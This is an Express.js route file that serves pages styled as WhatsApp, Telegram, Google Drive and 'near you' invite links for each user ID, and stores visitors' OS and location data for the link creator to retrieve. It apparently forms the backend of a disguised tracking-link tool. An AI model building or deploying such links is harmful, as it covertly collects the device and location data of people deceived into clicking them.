var express = require('express');
var router = express.Router();
var path = require('path');
const AuthToken = require('./../middleware/auth')
const constant = require('./../config/constant')

const commonController = require('../controller/commonController');
const osDetailsController = require('../controller/osdetailsController');
const generateUrlController = require('../controller/generateUrlController');
const upload = require('../config/multer');

/* GET home page. */
// router.get('/', function(req, res, next) {
//   res.render('index', { title: 'Express' });
// });

router.post('/uploadFile', upload.any(), async function (req, res, next) {
  let data = await commonController.uploadFile(req, res)
  res.send(data)
})

router.get('/whatsapplink/:userId', function(req, res, next) {
  console.log('####', req.params.userId);
  res.sendFile(path.join(__dirname + '/../public/whatsapp.html'))
});

router.get('/whatsapplink', function(req, res, next) {
  res.sendFile(path.join(__dirname + '/../public/whatsapp.html'))
});


router.get('/nearyoulink/:userId', function(req, res, next) {
  res.sendFile(path.join(__dirname + '/../public/nearyou.html'))
});


router.get('/telegramlink/:userId', function(req, res, next) {
  res.sendFile(path.join(__dirname + '/../public/telegram.html'))
});

router.get('/gdrivelink/:userId', function(req, res, next) {
  res.sendFile(path.join(__dirname + '/../public/gdrive.html'))
});

router.post('/createUrl', AuthToken, async function(req, res) {
  const data = await generateUrlController.addURLData({groupName: req.body.groupName, groupImg: req.body.groupImg, userUniqId: req.userData.userUniquId, urlType: req.body.urlType, userName: req.body.userName, sharingUrl: req.body.sharingUrl}, res)
  res.json({
    data: data
  })
})

router.post('/getUrlData', async function(req, res) {
  const data = await generateUrlController.getUrlData({id: req.body.userUniqId}, res)
  console.log('@@@userData', data);
  res.send(data);
})


router.post('/saveuserData', async function (req, res) {
  let data = await osDetailsController.addOSDetails(req)
  res.json({
    data: 'data saved succesfully'
  })
})

router.post('/saveLocationData', async function (req, res) {
  let data = await osDetailsController.addLocationDetails(req)
  res.json({
    data: data
  })
})

router.get('/getOsDetailsByUser', AuthToken, async function (req, res) {
  let data = await osDetailsController.getAllOsDetails(req)
  res.json({
    data: data
  })
})

module.exports = router;
